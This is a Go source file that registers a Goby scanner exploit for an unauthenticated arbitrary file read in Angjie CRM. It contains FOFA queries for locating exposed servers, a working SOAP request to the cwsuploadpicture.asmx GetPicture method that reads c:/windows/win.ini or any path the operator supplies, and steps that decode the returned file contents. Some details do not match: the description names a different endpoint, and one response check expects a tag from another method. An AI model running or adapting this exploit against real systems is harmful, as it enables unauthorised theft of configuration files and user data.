package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Angjie CRM /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx File Read Vulnerability",
    "Description": "<p>Angjie CRM (Customer Relationship Management) is a system provided by Shenzhen Angjie Information Technology Co., Ltd., focusing on customer relationship management in the retail industry. This vulnerability exists in the DownFileBytes instance of the cwsfiledown.asmx interface in the Angjie CRM system. Attackers can construct specific SOAP requests to read arbitrary files in the system without authentication, potentially leading to sensitive information disclosure.</p>",
    "Product": "Angjie CRM",
    "Homepage": "https://www.enjoyit.com.cn",
    "DisclosureDate": "2024-11-27",
    "PostTime": "2024-12-19",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"CheckSilverlightInstalled\" && body=\"AllowHtmlPopupwindow\"",
    "GobyQuery": "body=\"CheckSilverlightInstalled\" && body=\"AllowHtmlPopupwindow\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system through unauthorized access, potentially leading to sensitive information disclosure, including system configuration files and user data, which may be further exploited for deeper attacks.</p>",
    "Recommendation": "<p>It is recommended to immediately fix the vulnerability, restrict access to the cwsfiledown.asmx interface, and ensure that only authenticated users can access it. Additionally, it is recommended to strictly validate file paths in the file reading functionality to prevent arbitrary file reading.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/MjJl2TpiM0H43jHJyFU9uA"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "c://windows//win.ini",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "c://windows//win.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": "http://tempuri.org/GetPicture"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetPicture xmlns=\"http://tempuri.org/\">\r\n      <sFullFileName>c:/windows/win.ini</sFullFileName>\r\n    </GetPicture>\r\n  </soap:Body>\r\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<GetPictureResult>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": "http://tempuri.org/GetPicture"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetPicture xmlns=\"http://tempuri.org/\">\r\n      <sFullFileName>c:/windows/win.ini</sFullFileName>\r\n    </GetPicture>\r\n  </soap:Body>\r\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<DownFileBytesResult>91</DownFileBytesResult>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output_base64|lastbody|regex|<GetPictureResult>([\\s\\S]*?)</GetPictureResult>",
                "output|define|base64_decode|{{{output_base64}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "昂捷CRM /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx 文件读取漏洞",
            "Product": "昂捷CRM",
            "Description": "<p>昂捷CRM（Customer Relationship Management）是深圳市昂捷信息技术股份有限公司提供的一款专注于零售行业客户关系管理的系统。该漏洞存在于昂捷CRM系统的cwsfiledown.asmx接口的DownFileBytes实例处，攻击者可以通过构造特定的SOAP请求，未经身份验证读取系统中的任意文件，可能导致敏感信息泄露。</p>",
            "Recommendation": "<p>建议立即修复漏洞，限制cwsfiledown.asmx接口的访问权限，确保只有经过身份验证的用户才能访问。同时，建议对文件读取功能进行严格的路径校验，避免任意文件读取的发生。</p>",
            "Impact": "<p>该漏洞允许攻击者通过未授权访问读取系统中的任意文件，可能导致敏感信息泄露，包括系统配置文件、用户数据等，进一步可能被利用进行更深层次的攻击。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Angjie CRM /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx File Read Vulnerability",
            "Product": "Angjie CRM",
            "Description": "<p>Angjie CRM (Customer Relationship Management) is a system provided by Shenzhen Angjie Information Technology Co., Ltd., focusing on customer relationship management in the retail industry. This vulnerability exists in the DownFileBytes instance of the cwsfiledown.asmx interface in the Angjie CRM system. Attackers can construct specific SOAP requests to read arbitrary files in the system without authentication, potentially leading to sensitive information disclosure.</p>",
            "Recommendation": "<p>It is recommended to immediately fix the vulnerability, restrict access to the cwsfiledown.asmx interface, and ensure that only authenticated users can access it. Additionally, it is recommended to strictly validate file paths in the file reading functionality to prevent arbitrary file reading.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system through unauthorized access, potentially leading to sensitive information disclosure, including system configuration files and user data, which may be further exploited for deeper attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}